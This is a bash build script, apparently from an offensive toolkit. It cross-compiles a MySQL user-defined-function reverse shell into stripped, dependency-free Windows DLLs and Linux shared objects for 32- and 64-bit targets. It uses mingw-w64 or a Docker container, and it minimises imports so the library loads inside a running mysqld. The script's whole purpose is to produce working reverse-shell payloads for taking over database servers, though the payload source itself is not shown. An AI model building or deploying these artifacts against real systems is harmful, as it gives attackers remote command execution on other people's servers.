#!/usr/bin/env bash
#
# build.sh - build the MySQL UDF reverse shell for Windows & Linux (32/64-bit)
#
# Static, no debug info:
#   Windows : freestanding DLL (-nostdlib, custom mem/str/atoi + DllMain)
#             -> imports only KERNEL32.dll / WS2_32.dll
#   Linux   : shared object with no DT_NEEDED (-nostdlib); symbols resolve
#             from the libc already loaded into mysqld
#
# Requirements (macOS):
#   brew install mingw-w64        # Windows toolchain
#   Docker Desktop                # Linux cross-build container
#
# Usage: ./build.sh
set -euo pipefail

ROOT="$(cd "$(dirname "$0")" && pwd)"
SRC="$ROOT/src/reverseShell_udf.c"
OUT="$ROOT"

WIN64_PREFIX="x86_64-w64-mingw32"
WIN32_PREFIX="i686-w64-mingw32"

WIN_CFLAGS="-shared -O2 -s -nostdlib -fno-builtin -DUDF_MINIMAL"
LINUX_CFLAGS="-shared -fPIC -O2 -s -nostdlib -fno-stack-protector"

[ -f "$SRC" ] || { echo "[!] source not found: $SRC" >&2; exit 1; }

need() { command -v "$1" >/dev/null 2>&1 || { echo "[!] missing '$1' - $2" >&2; exit 1; }; }

build_windows() {
  local cc64 cc32
  cc64="${WIN64_PREFIX}-gcc"
  cc32="${WIN32_PREFIX}-gcc"
  need "$cc64" "install with: brew install mingw-w64"
  need "$cc32" "install with: brew install mingw-w64"

  echo "[*] Windows x86-64 -> reverseShell_udf_win64.dll"
  "$cc64" $WIN_CFLAGS -Wl,--entry,DllMain \
    -o "$OUT/reverseShell_udf_win64.dll" "$SRC" -lws2_32 -lkernel32

  echo "[*] Windows i386   -> reverseShell_udf_win32.dll"
  "$cc32" $WIN_CFLAGS -Wl,--entry,_DllMain@12 \
    -o "$OUT/reverseShell_udf_win32.dll" "$SRC" -lws2_32 -lkernel32
}

build_linux() {
  if command -v gcc >/dev/null 2>&1 && gcc -m32 -shared -fPIC -x c /dev/null -o /dev/null >/dev/null 2>&1; then
    echo "[*] Linux build: native gcc -m32/-m64"
    gcc -m64 $LINUX_CFLAGS -o "$OUT/reverseShell_udf_linux64.so" "$SRC"
    gcc -m32 $LINUX_CFLAGS -o "$OUT/reverseShell_udf_linux32.so" "$SRC"
    return
  fi

  need docker "install Docker Desktop, or install gcc with 32-bit multilib"
  echo "[*] Linux build: docker (debian:bookworm-slim + gcc-multilib)"
  docker run --rm \
    -e HOST_UID="$(id -u)" -e HOST_GID="$(id -g)" \
    -v "$ROOT":/work -w /work debian:bookworm-slim bash -c '
      set -e
      apt-get update -qq
      apt-get install -y -qq --no-install-recommends gcc-multilib binutils >/dev/null
      gcc -m64 '"$LINUX_CFLAGS"' -o reverseShell_udf_linux64.so src/reverseShell_udf.c
      gcc -m32 '"$LINUX_CFLAGS"' -o reverseShell_udf_linux32.so src/reverseShell_udf.c
      chown "$HOST_UID:$HOST_GID" reverseShell_udf_linux64.so reverseShell_udf_linux32.so 2>/dev/null || true
    '
}

build_windows
build_linux

echo
echo "[+] Done. Artifacts in $OUT:"
ls -l "$OUT"/reverseShell_udf_*.dll "$OUT"/reverseShell_udf_*.so
